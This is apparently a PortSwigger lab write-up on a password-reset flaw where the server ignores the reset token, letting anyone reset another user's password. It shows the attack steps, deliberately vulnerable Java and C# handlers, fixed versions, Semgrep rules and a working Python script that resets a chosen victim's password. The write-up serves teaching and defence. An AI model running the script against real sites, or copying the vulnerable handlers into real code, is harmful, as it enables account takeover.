---
title: "Lab 11: Password reset broken logic"
date: 2025-12-21
categories: [portswigger, authentication] 
image: portswigger.png
media_subpath: /assets/img/posts/2025-12-21-lab11_authentication/
---

## 1. Executive Summary

**Vulnerability:** Broken Password Reset (Token Validation Bypass).

**Description:** The application implements a password reset flow that includes a token in the URL and form body. However, the backend server completely ignores this token during the final "Set New Password" step. It trusts the `username` hidden field blindly, allowing anyone to reset any user's password without proving they received the reset email.

**Impact:** Full Account Takeover. An attacker can reset the password for any user (including administrators) simply by sending a POST request with the victim's username and an empty token.

## 2. The Attack

**Objective:** Reset `carlos`'s password without access to his email.

1. **Reconnaissance (Mapping the Flow):**
    - I initiated a password reset for my own user (`wiener`).
    - I received the email and clicked the link: `/forgot-password?temp-forgot-password-token=TOKEN`.
    - I entered a new password and submitted the form.
    - I captured the `POST /forgot-password` request in Burp Proxy.
2. **Hypothesis Testing:**
    - I saw the request contained `username=wiener` and `temp-forgot-password-token=TOKEN`.
    - I sent the request to **Repeater**.
    - I removed the *value* of the token parameter (leaving `temp-forgot-password-token=` empty) in both the URL and the Body.
    - The server accepted the request. This confirmed the token was unused.
        
        ![image.png](image.png)
        
3. **Exploitation:**
    - I modified the `username` parameter from `wiener` to `carlos`.
    - I set `new-password` to `123456`.
    - I sent the request.
4. **Result:** The server responded with `200 OK` (or redirect). I successfully logged in as `carlos` with the new password `123456`.

## 3. Code Review

**Vulnerability Analysis (Explanation):**
The flaw is a **Missing Validation Step**. The code likely checks the token when *loading* the page (GET request) but fails to re-check it when *processing* the form (POST request).

- **The Flaw:** The `POST` handler relies entirely on the hidden `username` field.
- **The Reality:** Hidden fields are not secure; they are attacker-controlled.

### Java (Spring Boot)

```java
@PostMapping("/forgot-password")
public String resetPassword(@RequestParam String username, 
                            @RequestParam String newPassword, 
                            @RequestParam(name="temp-forgot-password-token", required=false) String token) {
    
    // VULNERABLE: The token is accepted as an argument but NEVER CHECKED.
    User user = userRepository.findByUsername(username);
    
    if (user != null) {
        // FLAW: We assume that if they reached this endpoint, they must have had a valid token.
        // But attackers can send POST requests directly without visiting the GET page first.
        userService.changePassword(user, newPassword);
        return "redirect:/login?reset=success";
    }
    
    return "error";
}
```

**Technical Flow & Syntax Explanation:**

- **`@RequestParam ... required=false`**: The token is marked as optional (or simply ignored in the logic body).
- **`userService.changePassword`**: The sensitive action is performed based solely on the `username` input. There is no `tokenRepository.verify(token)` call inside this method.

### C# (ASP.NET Core)

```csharp
[HttpPost("reset-password")]
public async Task<IActionResult> ResetPassword(ResetPasswordViewModel model)
{
    var user = await _userManager.FindByNameAsync(model.Username);
    if (user == null) return BadRequest();

    // VULNERABLE: The 'Token' property exists in the model, but is ignored.
    // var result = await _userManager.ResetPasswordAsync(user, model.Token, model.NewPassword);
    
    // INSTEAD, the developer used a direct forced reset:
    var token = await _userManager.GeneratePasswordResetTokenAsync(user); // Generates a new one internally?!
    var result = await _userManager.ResetPasswordAsync(user, token, model.NewPassword);
    
    return Ok();
}
```

**Technical Flow & Syntax Explanation:**

- **Ignored Input**: The code might generate a *fresh* token internally to satisfy the API signature, completely bypassing the requirement for the user to provide the token sent to their email.
- **Logic Gap**: The developer treats the POST request as an administrative "force reset" rather than a user-initiated "verify and reset."

### Mock PR Comment

The `resetPassword` method accepts a `token` parameter but never validates it against the database. It allows password changes based solely on the `username` parameter.

**Recommendation:**

1. Verify that the `token` provided matches the one stored in the database for that user.
2. Ensure the token is not expired.
3. Do not trust the `username` parameter blindly; derive the user *from* the valid token.

## 4. The Fix

**Explanation of the Fix:**
We must make the **Token** the source of truth, not the **Username**.

1. Lookup the user *by the token*.
2. If the token is valid and not expired, change the password.
3. Ideally, don't even accept a `username` parameter in the POST body; the token implies the user.

### Secure Java

```java
@PostMapping("/forgot-password")
public String resetPassword(@RequestParam("token") String token, 
                            @RequestParam("newPassword") String newPassword) {
    
    // SECURE: Lookup user BY TOKEN.
    PasswordResetToken resetToken = tokenRepository.findByToken(token);
    
    if (resetToken == null || resetToken.isExpired()) {
        return "redirect:/error?msg=invalid_token";
    }
    
    User user = resetToken.getUser();
    userService.changePassword(user, newPassword);
    
    // Burn the token so it can't be used again
    tokenRepository.delete(resetToken);
    
    return "redirect:/login?reset=success";
}
```

### Secure C#

```csharp
[HttpPost("reset-password")]
public async Task<IActionResult> ResetPassword(ResetPasswordViewModel model)
{
    var user = await _userManager.FindByNameAsync(model.Username);
    
    // SECURE: The framework's ResetPasswordAsync validates the token signature.
    var result = await _userManager.ResetPasswordAsync(user, model.Token, model.NewPassword);
    
    if (!result.Succeeded) {
        return BadRequest("Invalid token.");
    }
    return Ok();
}
```

## 5. Automation

*A Python script that sends the exploit request with the empty token.*

```python
#!/usr/bin/env python3
import argparse
import requests
import sys

def exploit_reset_bypass(url, victim_username, new_password):
    target_url = f"{url.rstrip('/')}/forgot-password"

    params = {"temp-forgot-password-token": ""}

    data = {
    "username": victim_username,
    "new-password-1": new_password,
    "new-password-2": new_password,
    "temp-forgot-password-token": "" #empty token in body too
    }

    print(f"[*] Targeting: {target_url}")
    print(f"[*] Resetting password for: {victim_username} -> {new_password}")

    try:
        resp = requests.post(target_url, params=params, data=data, allow_redirects=False)
        print(f"[*] Status Code: {resp.status_code}")

        if resp.status_code == 302 or (resp.status_code == 200 and "error" not in resp.text):
            print("[!!!] SUCCESS: Password reset request accepted.")
            print(f"[*] You can now login as {victim_username}:{new_password}")
        else:
            print("[-] Failed. The token might actually be required.")
            
    except Exception as e:
        print(f"[-] Error: {e}")

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("url", help="Lab URL")
    ap.add_argument("victim", help="Victim username (e.g. carlos)")
    ap.add_argument("password", help="New password to set")
    args = ap.parse_args()

    exploit_reset_bypass(args.url, args.victim, args.password)

if __name__ == "__main__":
    main()
```

## 6. Static Analysis (Semgrep)

*These rules look for Password Reset endpoints that take a token but fail to call a validation method on it.*

### Java Rule

```yaml
rules:
  - id: java-unchecked-reset-token
    languages: [java]
    message: |
      Password reset logic detected. Ensure the 'token' parameter is verified 
      against the database before changing the password. 
      Do not rely solely on the 'username' parameter.
    severity: ERROR
    patterns:
      - pattern-inside: |
          @PostMapping(...)
          public $RET $METHOD(..., String $TOKEN, ...) { ... }
      - pattern: |
          // Heuristic: Changing password without checking token
          $SERVICE.changePassword($USER, ...);
      - pattern-not-inside: |
          if ($TOKEN_REPO.findByToken($TOKEN) != null) { ... }
      - pattern-not-inside: |
          if ($SERVICE.validate($TOKEN)) { ... }
```

**Technical Flow & Syntax Explanation:**

- **`pattern`**: Finds the critical action (`changePassword`).
- **`pattern-not-inside`**: This is the safety check. If Semgrep sees a validation call (like `findByToken` or `validate`) wrapping the change password logic, it will *not* flag the code. If that check is missing, it alerts.

### C# Rule

```yaml
rules:
  - id: csharp-unchecked-reset-token
    languages: [csharp]
    message: "Password reset logic ignores the token parameter."
    severity: ERROR
    patterns:
      - pattern-inside: |
          public async Task<IActionResult> $METHOD(..., string $TOKEN, ...) { ... }
      - pattern: |
          // Heuristic: Resetting without passing token to the manager
          _userManager.ResetPasswordAsync($USER, $IGNORED_TOKEN, ...);
```
